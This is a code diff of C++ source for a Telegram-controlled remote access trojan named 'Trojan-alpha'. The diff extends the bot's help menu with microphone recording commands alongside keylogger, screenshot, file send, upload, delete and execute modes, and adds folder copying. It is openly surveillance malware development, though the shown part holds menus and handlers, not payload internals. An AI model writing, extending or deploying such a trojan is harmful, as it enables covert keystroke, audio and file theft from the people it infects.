@@ -38,23 +38,31 @@ void startBot(const std::string& token)
 		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
 			ostringstream commands;
 			commands << "Hello, welcome to Trojan-alpha. Here's the commands you can use:\n"
+				<< "KeyLogger:\n"
 				<< "/start_key_logger - starts key logger;\n"
-				<< "/kill_key_logger - kills key logger;\n"
-				<< "/send_scr - makes and sends screenshot;\n"
+				<< "/kill_key_logger - kills current key logger session;\n"
 				<< "/send_key_logger - sends a file with key logs;\n"
+				<< "Microphone record:\n"
+				<< "/start_record - starts microphone record;\n"
+				<< "/kill_record - kills current microphone record session;\n"
+				<< "/send_record - sends a file with microphone records;\n"
+				<< "Other:\n"
+				<< "/send_scr - makes and sends screenshot;\n"
+				<< "Modes:\n"
 				<< "/check_dir_mode - opens check directory mode;\n"
 				<< "/full_check_dir_mode - opens full check directory mode;\n"
 				<< "/start_file_mode - opens start file mode;\n"
 				<< "/delete_file_mode - opens delete file mode;\n"
 				<< "/copy_file_mode - opens copy file mode;\n"
-				<< "/send_file_mode - opens send file mode;\n"
+				<< "/send_file_mode - opens send file or folder mode;\n"
 				<< "/upload_file_mode - opens upload file mode;\n"
 				<< "/play_music_mode - opens play music mode;\n"
+				<< "Termination commands:\n"
 				<< "/stop_music - stops music;\n"
 				<< "/exit_mode - exits your current mode.\n";
 
 			bot.getApi().sendMessage(message->chat->id, commands.str());
-			bot.getApi().sendMessage(message->chat->id, string("ChatID: ") + to_string(message->chat->id));
+			bot.getApi().sendMessage(message->chat->id, "ChatID: " + to_string(message->chat->id));
 			});
 		});
 
@@ -174,7 +182,7 @@ void startBot(const std::string& token)
 
 	bot.getEvents().onCommand("copy_file_mode", [&bot](TgBot::Message::Ptr message) {
 		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
-			bot.getApi().sendMessage(chat_id, "Send a path of a file you want to copy.");
+			bot.getApi().sendMessage(chat_id, "Send a path of a file or a folder you want to copy.\n(C:\\path\\to\\your\\file\\file.txt)");
 			currentMode = Mode::COPY_FILE;
 			});
 		});
